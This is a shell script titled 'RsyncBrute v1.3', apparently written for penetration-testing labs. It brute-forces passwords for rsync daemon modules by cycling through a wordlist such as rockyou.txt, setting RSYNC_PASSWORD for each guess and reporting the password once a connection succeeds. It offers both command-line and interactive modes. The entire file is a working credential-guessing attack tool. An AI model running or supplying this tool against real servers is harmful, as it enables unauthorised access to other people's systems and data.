#!/bin/sh
show_help() {
  echo "RsyncBrute v1.3"
  echo "OPTIONS:"
  echo "  -4/-6 Use IPv4 / IPv6 address"
  echo "  -w    Wordlist path"
  echo "  -i    Interactive mode"
  echo "  -h	Show this help"
  echo "EXAMPLES:"
  echo "  ./rsyncBrute.sh -4 bender@10.10.10.111:873/module -w /usr/share/wordlists/rockyou.txt"
  echo "  ./rsyncBrute.sh -6 bender@[dead:beef::250:56ff:febd:3af3]:873/module -w /usr/share/wordlists/rockyou.txt"
  echo "  ./rsyncBrute.sh -i"
  exit
}

interactive() {
  echo "RsyncBrute v1.3"
  read -p "Target IPv4 or IPv6? (4/6): " version
  read -p "Target IP: " ip
  read -p "Target port: " port
  read -p "Username: " user
  read -p "Wordlist: " wordlist
  read -p "Module: " module
  if [ "$version" == "6" ]; then ip="["$ip"]"; fi
  while IFS= read -r pass ;do
    echo -ne "Trying with password: $pass      \r"
    export RSYNC_PASSWORD=$pass
    rsync rsync://$user@$ip:$port/$module &>/dev/null
    if [ $? -eq 0 ]; then
      echo
      echo 'Password is: '$pass
      exit
    fi
  done < "$wordlist"
}

if [ "$1" == "-i" ] && [ $# -eq 1 ]; then
  interactive
elif [ $# != 4 ]; then
  show_help
fi

for arg in $(seq 1 2 $#) ;do
  opt=$(echo $@ | cut -d " " -f$arg)
  case $opt in
    -4)
      ((arg++))
      command=$(echo $@ | cut -d " " -f$arg)
    ;;
    -6)
      ((arg++))
      command=$(echo $@ | cut -d " " -f$arg)
    ;;
    -w)
      ((arg++))
      wordlist=$(echo $@ | cut -d " " -f$arg)
    ;;
    *)
      show_help
    ;;
  esac
done

echo "RsyncBrute v1.3"
while IFS= read -r pass
do
  echo -ne "Trying with password: $pass      \r"
  export RSYNC_PASSWORD=$pass
  rsync rsync://$command &>/dev/null
  if [ $? -eq 0 ]; then
    echo
    echo 'Password is: '$pass
    exit
  fi
done < "$wordlist"
